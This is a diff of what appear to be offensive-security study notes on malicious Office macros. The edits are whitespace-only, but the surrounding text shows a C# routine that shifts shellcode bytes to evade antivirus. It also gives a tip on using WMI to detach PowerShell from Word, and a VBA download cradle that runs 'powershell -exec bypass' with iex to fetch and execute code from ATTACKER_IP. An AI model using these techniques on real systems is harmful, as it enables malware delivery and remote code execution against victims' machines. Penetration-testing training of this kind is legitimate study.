@@ -31,7 +31,7 @@ namespace Helper
             byte[] encoded = new byte[buf.Length];
 		    for(int i = 0; i < buf.Length; i++)
 		    {
-		      encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+			  encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
 		    }
 		 
 		    uint counter = 0;
@@ -248,7 +248,7 @@ End Sub
 > [!Note]
 > When performing an action, the Winmgmt WMI service is created in a separate process as a child process of [_Wmiprvse.exe_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/provider-hosting-and-security), which means we can de-chain the PowerShell process from Microsoft Word.
 
-2Download cradle:
+Download cradle:
 ```vb
 Sub MyMacro
   strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://ATTACKER_IP/run.txt'))"
